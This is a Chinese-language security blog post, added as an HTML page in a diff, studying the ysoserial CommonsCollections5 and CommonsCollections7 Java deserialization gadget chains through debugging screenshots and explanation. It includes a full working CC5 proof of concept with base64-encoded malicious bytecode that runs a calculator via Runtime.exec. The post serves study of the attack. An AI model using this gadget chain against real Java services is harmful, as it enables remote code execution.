@@ -1,0 +1,620 @@
+<!DOCTYPE html>
+<html lang="en" color-mode="light">
+
+  <head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <meta name="keywords" content="" />
+  <meta name="author" content="tiehanhan" />
+  <meta name="description" content="" />
+  
+  
+  <title>
+    
+      java安全漫谈观后感(十)-CC补漏篇 
+      
+      
+      |
+    
+     daidaitiehanhan&#39;s blog
+  </title>
+
+  
+    <link rel="apple-touch-icon" href="/images/avatar.gif">
+    <link rel="icon" href="/images/avatar.gif">
+  
+
+  <!-- Raleway-Font -->
+  <link href="https://fonts.googleapis.com/css?family=Raleway&display=swap" rel="stylesheet">
+
+  <!-- hexo site css -->
+  
+<link rel="stylesheet" href="/css/color-scheme.css">
+<link rel="stylesheet" href="/css/base.css">
+<link rel="stylesheet" href="/iconfont/iconfont.css">
+<link rel="stylesheet" href="/css/github-markdown.css">
+<link rel="stylesheet" href="/css/highlight.css">
+<link rel="stylesheet" href="/css/comments.css">
+
+
+  <!-- jquery3.3.1 -->
+  <script src="https://cdn.bootcss.com/jquery/3.3.1/jquery.min.js"></script>
+
+  <!-- fancybox -->
+  <link href="https://cdn.bootcss.com/fancybox/3.5.2/jquery.fancybox.min.css" rel="stylesheet">
+  <script async src="https://cdn.bootcss.com/fancybox/3.5.2/jquery.fancybox.min.js"></script>
+  
+<script src="/js/fancybox.js"></script>
+
+
+  
+
+  <script>
+    var html = document.documentElement
+    const colorMode = localStorage.getItem('color-mode')
+    if (colorMode) {
+      document.documentElement.setAttribute('color-mode', colorMode)
+    }
+  </script>
+
+<meta name="generator" content="Hexo 6.1.0"></head>
+
+
+  <body>
+    <div id="app">
+      <div class="header">
+  <div class="avatar">
+    <a href="/">
+      <!-- 头像取消懒加载，添加no-lazy -->
+      
+        <img src="/images/avatar.gif" alt="">
+      
+    </a>
+    <div class="nickname"><a href="/">tiehanhan</a></div>
+  </div>
+  <div class="navbar">
+    <ul>
+      
+        <li class="nav-item" data-path="/">
+          <a href="/">Home</a>
+        </li>
+      
+        <li class="nav-item" data-path="/archives/">
+          <a href="/archives/">Archives</a>
+        </li>
+      
+        <li class="nav-item" data-path="/friends/">
+          <a href="/friends/">Friends</a>
+        </li>
+      
+        <li class="nav-item" data-path="/about/">
+          <a href="/about/">About</a>
+        </li>
+      
+    </ul>
+  </div>
+</div>
+
+
+<script src="/js/activeNav.js"></script>
+
+
+
+      <div class="flex-container">
+        <!-- 文章详情页，展示文章具体内容，url形式：https://yoursite/文章标题/ -->
+<!-- 同时为「标签tag」，「朋友friend」，「分类categories」，「关于about」页面的承载页面，具体展示取决于page.type -->
+
+<!-- LaTex Display -->
+<script src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script>
+<script type="text/javascript" id="MathJax-script" async
+  src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-chtml.js">
+</script>
+<script>
+MathJax = {
+  tex: {
+    inlineMath: [['$', '$'], ['\\(', '\\)']]
+  }
+};
+</script>
+
+
+
+  
+
+  
+
+  
+
+  
+  <!-- 文章内容页 url形式：https://yoursite/文章标题/ -->
+  <div class="container post-details" id="post-details">
+    <div class="post-content">
+      <div class="post-title">java安全漫谈观后感(十)-CC补漏篇</div>
+      <div class="post-attach">
+        <span class="post-pubtime">
+          <i class="iconfont icon-updatetime" title="Update time"></i>
+          2022-04-29 23:20:19
+        </span>
+        
+      </div>
+      <div class="markdown-body">
+        <h1 id="java安全漫谈观后感-十-CC补漏篇"><a href="#java安全漫谈观后感-十-CC补漏篇" class="headerlink" title="java安全漫谈观后感(十)-CC补漏篇"></a>java安全漫谈观后感(十)-CC补漏篇</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>p神的java安全漫谈讲到CC4后暂时没更新跟CC相关的内容了，frohoff师傅原版的<a target="_blank" rel="noopener" href="https://github.com/frohoff/ysoserial/tree/master/src/main/java/ysoserial/payloads">ysoserial</a>里还有CC5和CC7没讲，学。</p>
+<h2 id="CommonsCollections5"><a href="#CommonsCollections5" class="headerlink" title="CommonsCollections5"></a>CommonsCollections5</h2><h3 id="yso中的CC5"><a href="#yso中的CC5" class="headerlink" title="yso中的CC5"></a>yso中的CC5</h3><p>直接看看yso的利用链</p>
+<p><img src="/2022/04/29/java%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88%E8%A7%82%E5%90%8E%E6%84%9F(%E5%8D%81)-CC%E8%A1%A5%E6%BC%8F%E7%AF%87/image-20220424225836004.png" alt="image-20220424225836004"></p>
+<p>可以看到<code>ChainedTransformer.transform()</code>之后这部分都是老熟人了，后面这一坨和前面学习的内容是一样的，就不用分析了。且可以看到这里是<code>LazyMap.get()</code>触发的<code>transform()</code>方法，关键点在怎么触发<code>LazyMap.get()</code>。前面学习CC6时知道<code>TiedMapEntry.hashCode()</code>可以触发，这里CC5用到的是一种新思路，利用<code>TiedMapEntry.toString()</code>。而<code>BadAttributeValueExpException</code>的反序列化可以触发到<code>TiedMapEntry.toString()</code>。这里的注释部分还提示了CC5只能在8u76且没有<code>security manager</code>的情况下使用。</p>
+<h4 id="TiedMapEntry-toString"><a href="#TiedMapEntry-toString" class="headerlink" title="TiedMapEntry.toString()"></a>TiedMapEntry.toString()</h4><p><code>TiedMapEntry</code>的<code>toString()</code>方法可以触发到<code>this.getkey()</code>和<code>this.getValue()</code></p>
+<p><img src="/2022/04/29/java%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88%E8%A7%82%E5%90%8E%E6%84%9F(%E5%8D%81)-CC%E8%A1%A5%E6%BC%8F%E7%AF%87/image-20220424230928498.png" alt="image-20220424230928498"></p>
+<p>其中的<code>this.getValue()</code>是关键，<code>TiedMapEntry.hashCode()</code>触发<code>LazyMap.get()</code>也是利用到了<code>TiedMapEntry.getValue()</code></p>
+<p><img src="/2022/04/29/java%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88%E8%A7%82%E5%90%8E%E6%84%9F(%E5%8D%81)-CC%E8%A1%A5%E6%BC%8F%E7%AF%87/image-20220424231037047.png" alt="image-20220424231037047"></p>
+<h4 id="BadAttributeValueExpException"><a href="#BadAttributeValueExpException" class="headerlink" title="BadAttributeValueExpException"></a>BadAttributeValueExpException</h4><p><code>BadAttributeValueExpException.readObject</code>的可以触发<code>valObj.toString()</code>。可以看到只有当满足<code>System.getSecurityManager()</code>为空，或者valObj是Long等数据类型的实例时才可以触发<code>toString()</code>方法。而valObj是取自反序列化后<code>BadAttributeValueExpException</code>的val属性。</p>
+<p><img src="/2022/04/29/java%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88%E8%A7%82%E5%90%8E%E6%84%9F(%E5%8D%81)-CC%E8%A1%A5%E6%BC%8F%E7%AF%87/image-20220424232606722.png" alt="image-20220424232606722"></p>
+<p>看看<code>BadAttributeValueExpException</code>的构造函数，很简单，构造函数的作用就是给自己的val属性赋值。</p>
+<p><img src="/2022/04/29/java%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88%E8%A7%82%E5%90%8E%E6%84%9F(%E5%8D%81)-CC%E8%A1%A5%E6%BC%8F%E7%AF%87/image-20220424232931497.png" alt="image-20220424232931497"></p>
+<p>为了触发<code>TiedMapEntry.toString()</code>，显然这里构造函数应该传入<code>TiedMapEntry</code>对象。而<code>TiedMapEntry</code>对象显然不会是Long等数据类型的实例，所以当且仅当<code>System.getSecurityManager() == null</code>，才能顺利触发<code>TiedMapEntry.toString()</code>。也即是我们前面看到yso中作者的注释，需要没配置<code>security manager</code>。</p>
+<p><img src="/2022/04/29/java%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88%E8%A7%82%E5%90%8E%E6%84%9F(%E5%8D%81)-CC%E8%A1%A5%E6%BC%8F%E7%AF%87/image-20220424233455638.png" alt="image-20220424233455638"></p>
+<p>注意到<code>BadAttributeValueExpException</code>构造函数里也有<code>toString()</code>。</p>
+<p><img src="/2022/04/29/java%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88%E8%A7%82%E5%90%8E%E6%84%9F(%E5%8D%81)-CC%E8%A1%A5%E6%BC%8F%E7%AF%87/image-20220424233740481.png" alt="image-20220424233740481"></p>
+<p>为了避免在本地触发代码执行，我们<code>new BadAttributeValueExpException</code>时传入一个无害的null，后面再反射修改其中的val属性。</p>
+<p>把前面CC6的代码拿过来，把出发点从<code>HashMap</code>改成<code>BadAttributeValueExpException</code>，再反射改val属性，yso中的CC5就完成了，整体还是比较简单。</p>
+<p><img src="/2022/04/29/java%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88%E8%A7%82%E5%90%8E%E6%84%9F(%E5%8D%81)-CC%E8%A1%A5%E6%BC%8F%E7%AF%87/image-20220424233956804.png" alt="image-20220424233956804"></p>
+<p>Gadget Chain如下:</p>
+<p><img src="/2022/04/29/java%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88%E8%A7%82%E5%90%8E%E6%84%9F(%E5%8D%81)-CC%E8%A1%A5%E6%BC%8F%E7%AF%87/image-20220424234150705.png" alt="image-20220424234150705"></p>
+<p>核心步骤:</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//  Gadet Chain:</span></span><br><span class="line"><span class="comment">//     javax.management.BadAttributeValueExpException.readObject()</span></span><br><span class="line"><span class="comment">//         org.apache.commons.collections.keyvalue.TiedMapEntry.toString()</span></span><br><span class="line"><span class="comment">//         org.apache.commons.collections.keyvalue.TiedMapEntry.getValue()</span></span><br><span class="line"><span class="comment">//             org.apache.commons.collections.map.LazyMap.get()</span></span><br><span class="line"><span class="comment">//                 org.apache.commons.collections.functors.ChainedTransformer.transform()</span></span><br><span class="line"><span class="comment">//                 org.apache.commons.collections.functors.InvokerTransformer.transform()</span></span><br><span class="line"><span class="comment">//                     Runtime.exec()</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="关于注释中的8u76"><a href="#关于注释中的8u76" class="headerlink" title="关于注释中的8u76"></a>关于注释中的8u76</h4><p>本地测了8u231，8u101，8u40，甚至6u45这条链子都可以弹出来计算器，我把本地idea触发toString()关掉后还是可以正常触发，有点奇怪。</p>
+<p>看到作者注释中的<a target="_blank" rel="noopener" href="https://github.com/JetBrains/jdk8u_jdk/commit/af2361ee2878302012214299036b3a8b4ed36974#diff-f89b1641c408b60efe29ee513b3d22ffR70">commit</a></p>
+<p><img src="/2022/04/29/java%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88%E8%A7%82%E5%90%8E%E6%84%9F(%E5%8D%81)-CC%E8%A1%A5%E6%BC%8F%E7%AF%87/image-20220425000100387.png" alt="image-20220425000100387"></p>
+<p>这个commit后才增加了<code>readObject</code>方法，这里显示的8u76</p>
+<p><img src="/2022/04/29/java%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88%E8%A7%82%E5%90%8E%E6%84%9F(%E5%8D%81)-CC%E8%A1%A5%E6%BC%8F%E7%AF%87/image-20220425000412020.png" alt="image-20220425000412020"></p>
+<p>查了下<a target="_blank" rel="noopener" href="https://github.com/JetBrains/jdk8u_jdk%E8%BF%99%E4%B8%AA%E4%BB%93%E5%BA%93%E4%BC%BC%E4%B9%8E%E6%98%AFopenjdk%E7%9A%84%E6%BA%90%E7%A0%81%EF%BC%8C%E9%82%A3%E5%B0%B1%E9%9A%BE%E6%80%AA%E5%AF%B9%E4%B8%8D%E4%B8%8A%E4%BA%86%EF%BC%8C%E6%AD%A3%E5%B8%B8oracle">https://github.com/JetBrains/jdk8u_jdk这个仓库似乎是openjdk的源码，那就难怪对不上了，正常oracle</a> jdk测出来CC5这个链子通用性还是很不错滴。</p>
+<h3 id="无数组的CC5"><a href="#无数组的CC5" class="headerlink" title="无数组的CC5"></a>无数组的CC5</h3><p>结合前面的知识不难弄出无数组的CC5</p>
+<p><img src="/2022/04/29/java%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88%E8%A7%82%E5%90%8E%E6%84%9F(%E5%8D%81)-CC%E8%A1%A5%E6%BC%8F%E7%AF%87/image-20220425001413676.png" alt="image-20220425001413676"></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC5plus</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] code = Base64.decodeBase64(<span class="string">&quot;yv66vgAAADQAOgoACQAhCQAiACMIACQKACUAJgoAJwAoCAApCgAnACoHACsHACwBAAl0cmFuc2Zvcm0BAHIoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007W0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEAHUxieXRlY29kZXMvRXZpbFRlbXBsYXRlc0ltcGw7AQAIZG9jdW1lbnQBAC1MY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTsBAAhoYW5kbGVycwEAQltMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEACkV4Y2VwdGlvbnMHAC0BAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIaXRlcmF0b3IBADVMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yOwEAB2hhbmRsZXIBAEFMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEABjxpbml0PgEAAygpVgcALgEAClNvdXJjZUZpbGUBABZFdmlsVGVtcGxhdGVzSW1wbC5qYXZhDAAcAB0HAC8MADAAMQEAE0hlbGxvIFRlbXBsYXRlc0ltcGwHADIMADMANAcANQwANgA3AQA9L1N5c3RlbS9BcHBsaWNhdGlvbnMvQ2FsY3VsYXRvci5hcHAvQ29udGVudHMvTWFjT1MvQ2FsY3VsYXRvcgwAOAA5AQAbYnl0ZWNvZGVzL0V2aWxUZW1wbGF0ZXNJbXBsAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAE2phdmEvbGFuZy9FeGNlcHRpb24BABBqYXZhL2xhbmcvU3lzdGVtAQADb3V0AQAVTGphdmEvaW8vUHJpbnRTdHJlYW07AQATamF2YS9pby9QcmludFN0cmVhbQEAB3ByaW50bG4BABUoTGphdmEvbGFuZy9TdHJpbmc7KVYBABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7ACEACAAJAAAAAAADAAEACgALAAIADAAAAD8AAAADAAAAAbEAAAACAA0AAAAGAAEAAAAKAA4AAAAgAAMAAAABAA8AEAAAAAAAAQARABIAAQAAAAEAEwAUAAIAFQAAAAQAAQAWAAEACgAXAAIADAAAAEkAAAAEAAAAAbEAAAACAA0AAAAGAAEAAAAMAA4AAAAqAAQAAAABAA8AEAAAAAAAAQARABIAAQAAAAEAGAAZAAIAAAABABoAGwADABUAAAAEAAEAFgABABwAHQACAAwAAABMAAIAAQAAABYqtwABsgACEgO2AAS4AAUSBrYAB1exAAAAAgANAAAAEgAEAAAADwAEABAADAARABUAEgAOAAAADAABAAAAFgAPABAAAAAVAAAABAABAB4AAQAfAAAAAgAg&quot;</span>.getBytes());</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">obj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][] &#123;code&#125;);</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;2333&quot;</span>);</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">itransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;newTransformer&quot;</span>, <span class="literal">null</span>,<span class="literal">null</span>);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        Map outerMap= LazyMap.decorate(innerMap,itransformer);</span><br><span class="line">        TiedMapEntry tme=<span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(outerMap, obj);</span><br><span class="line"></span><br><span class="line">        BadAttributeValueExpException bada=<span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">f1</span> <span class="operator">=</span> BadAttributeValueExpException.class.getDeclaredField(<span class="string">&quot;val&quot;</span>);</span><br><span class="line">        f1.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        f1.set(bada, tme);</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">barr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(barr);</span><br><span class="line">        oos.writeObject(bada);</span><br><span class="line">        oos.close();</span><br><span class="line">        System.out.println(barr);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(barr.toByteArray()));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> (Object)ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>核心调用链和前面只有<code>Transformer</code>有变化</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//  Gadet Chain:</span></span><br><span class="line"><span class="comment">//     javax.management.BadAttributeValueExpException.readObject()</span></span><br><span class="line"><span class="comment">//         org.apache.commons.collections.keyvalue.TiedMapEntry.toString()</span></span><br><span class="line"><span class="comment">//         org.apache.commons.collections.keyvalue.TiedMapEntry.getValue()</span></span><br><span class="line"><span class="comment">//             org.apache.commons.collections.map.LazyMap.get()</span></span><br><span class="line"><span class="comment">//                 org.apache.commons.collections.functors.InvokerTransformer.transform()</span></span><br><span class="line"><span class="comment">//                     com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.newTransformer()</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="CommonsCollections7"><a href="#CommonsCollections7" class="headerlink" title="CommonsCollections7"></a>CommonsCollections7</h2><h3 id="yso中的CC7"><a href="#yso中的CC7" class="headerlink" title="yso中的CC7"></a>yso中的CC7</h3><p>看看yso中的CC7调用链</p>
+<p><img src="/2022/04/29/java%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88%E8%A7%82%E5%90%8E%E6%84%9F(%E5%8D%81)-CC%E8%A1%A5%E6%BC%8F%E7%AF%87/image-20220425001905852.png" alt="image-20220425001905852"></p>
+<p>基于<code>ChainedTransformer</code>触发代码执行，用<code>LazyMap.get</code>触发<code>transform()</code>方法，这些都是很熟悉的可以忽略，直接看怎么触发到<code>LazyMap.get</code>。这里利用到了<code>AbstractMap.equals</code>，而起点<code>Hashtable.readObject</code>可以触发到<code>AbstractMap.equals</code>。</p>
+<h4 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h4><p>这条链子感觉比CC5更复杂， 这里直接在HashTable.readObject处下断点调试跟下过程。</p>
+<p>发现会经历两次<code>reconstitutionPut()</code></p>
+<p><img src="/2022/04/29/java%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88%E8%A7%82%E5%90%8E%E6%84%9F(%E5%8D%81)-CC%E8%A1%A5%E6%BC%8F%E7%AF%87/image-20220425232226293.png" alt="image-20220425232226293"></p>
+<p>因为这里的循环次数是依据Hashtable中的元素量，yso实现CC7时做了两次<code>Hashtable.put</code>，分别传入两个不同的lazyMap。所以反序列化时Hashtable中有两个元素，会执行两次循环。</p>
+<p><img src="/2022/04/29/java%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88%E8%A7%82%E5%90%8E%E6%84%9F(%E5%8D%81)-CC%E8%A1%A5%E6%BC%8F%E7%AF%87/image-20220425232328289.png" alt="image-20220425232328289"></p>
+<p><code>LazyMap.get()</code>是在第二次<code>reconstitutionPut()</code>触发的，可以看到此时触发的是yso中第一个<code>LazyMap</code>和第二个<code>LazyMap</code>做<code>equals</code>操作。</p>
+<p><img src="/2022/04/29/java%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88%E8%A7%82%E5%90%8E%E6%84%9F(%E5%8D%81)-CC%E8%A1%A5%E6%BC%8F%E7%AF%87/image-20220425234337378.png" alt="image-20220425234337378"></p>
+<p>跟入，到了<code>AbstractMapDecorator.equals()</code></p>
+<p><img src="/2022/04/29/java%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88%E8%A7%82%E5%90%8E%E6%84%9F(%E5%8D%81)-CC%E8%A1%A5%E6%BC%8F%E7%AF%87/image-20220425234506058.png" alt="image-20220425234506058"></p>
+<p>继续跟，进入<code>AbstractMap.equals()</code></p>
+<p><img src="/2022/04/29/java%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88%E8%A7%82%E5%90%8E%E6%84%9F(%E5%8D%81)-CC%E8%A1%A5%E6%BC%8F%E7%AF%87/image-20220425234634784.png" alt="image-20220425234634784"></p>
+<p>触发到了<code>m.get(key)</code>，这里的m就是<code>Hashtable</code>中第二个<code>LazyMap</code>，触发到了<code>LazyMap.get()</code>，至此算是结束了。后面触发<code>transform()</code>都是老套路了，就不用讲了。</p>
+<h5 id="执行两次Hashtable-put的原因"><a href="#执行两次Hashtable-put的原因" class="headerlink" title="执行两次Hashtable.put的原因"></a>执行两次Hashtable.put的原因</h5><p>为啥yso中要执行两次<code>Hashtable.put</code>呢？</p>
+<p>跟第一次<code>Hashtable.reconstitutionPut()</code>，要触发到<code>.equals()</code>必须进入这个for循环，但是我们可以看到这里的<code>tab[index]</code>是null，会退出for循环，无法达到我们的预期。</p>
+<p><img src="/2022/04/29/java%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88%E8%A7%82%E5%90%8E%E6%84%9F(%E5%8D%81)-CC%E8%A1%A5%E6%BC%8F%E7%AF%87/image-20220425233049125.png" alt="image-20220425233049125"></p>
+<p>不过好在跳过for循环后，会对tab[index]赋值，这里把序列化的<code>Hashtable</code>第一个元素赋值给了tab。</p>
+<p><img src="/2022/04/29/java%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88%E8%A7%82%E5%90%8E%E6%84%9F(%E5%8D%81)-CC%E8%A1%A5%E6%BC%8F%E7%AF%87/image-20220425233356986.png" alt="image-20220425233356986"></p>
+<p>也即是触发<code>reconstitutionPut()</code>方法时<code>Hashtable</code>中的<code>table</code>参数。</p>
+<p><img src="/2022/04/29/java%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88%E8%A7%82%E5%90%8E%E6%84%9F(%E5%8D%81)-CC%E8%A1%A5%E6%BC%8F%E7%AF%87/image-20220425233528910.png" alt="image-20220425233528910"></p>
+<p>所以执行两次Hashtable.put的目的应该是给<code>Hashtable.table</code>赋值，以便进入我们想要的后续。</p>
+<h5 id="为什么最后有一句remove"><a href="#为什么最后有一句remove" class="headerlink" title="为什么最后有一句remove"></a>为什么最后有一句remove</h5><p>yso中的实现在最后有一句<code>remove</code>，我们把它注释掉，发现计算器出不来，那就调试分析原因。</p>
+<p>当我们在第二次<code>reconstitutionPut</code>循环，执行到关键的<code>AbstractMap.equals</code>时，可以发现此时的m有两个元素，莫名其妙多了一个key和value都是yy的键值对。</p>
+<p><img src="/2022/04/29/java%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88%E8%A7%82%E5%90%8E%E6%84%9F(%E5%8D%81)-CC%E8%A1%A5%E6%BC%8F%E7%AF%87/image-20220425225728038.png" alt="image-20220425225728038"></p>
+<p>此时<code>this.size()</code>也即是我们的第一组LazyMap的size是1，而这里第二个LazyMap的size却是2，会导致直接返回false，没法走到下面的关键的<code>m.get(key)</code>，所以没法正常触发<code>LazyMap.get</code>。</p>
+<p>所以CC7最后会有一段</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lazyMap2.remove(<span class="string">&quot;yy&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<p>给lazyMap2删除key是yy的元素。</p>
+<p>我们再分析分析这里的lazyMap2为啥会有两个元素。</p>
+<p>在CommonsCollections7下断点，观察lazyMap2变化，可以发现当执行<code>hashtable.put(lazyMap2, 2)</code>后，lazyMap2的size变成了2。所以在<code>hashtable.put</code>下断点跟跟</p>
+<p>发现在<code>hashtable.put</code>的时候，也会触发到<code>LazyMap.get()</code>，且这里有一段<code>this.map.put(key, value)</code></p>
+<p><img src="/2022/04/29/java%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88%E8%A7%82%E5%90%8E%E6%84%9F(%E5%8D%81)-CC%E8%A1%A5%E6%BC%8F%E7%AF%87/image-20220425235719860.png" alt="image-20220425235719860"></p>
+<p>这里put了一个key和value都是yy的元素，执行完这段后this.map就变成2个元素了。</p>
+<p><img src="/2022/04/29/java%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88%E8%A7%82%E5%90%8E%E6%84%9F(%E5%8D%81)-CC%E8%A1%A5%E6%BC%8F%E7%AF%87/image-20220426000145781.png" alt="image-20220426000145781"></p>
+<p>那为啥我们第一次<code>Hashtable.put</code>不会触发呢，看看<code>Hashtable.put</code>的实现。</p>
+<p><img src="/2022/04/29/java%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88%E8%A7%82%E5%90%8E%E6%84%9F(%E5%8D%81)-CC%E8%A1%A5%E6%BC%8F%E7%AF%87/image-20220426000555705.png" alt="image-20220426000555705"></p>
+<p>这里的过程类似<code>reconstitutionPut()</code>，第一次put时不会触发for循环，第二次put由于table已经有值了，所以会进入for循环触发到<code>entry.key.equals</code>，最后触发到<code>LazyMap.get()</code>。所以第二次及以后每次<code>Hashtable</code>新增符合条件(即能正常触发if语句，需要entry.hash&#x3D;&#x3D;hash)的元素都会触发<code>LazyMap.get</code>，需要<code>remove</code>。</p>
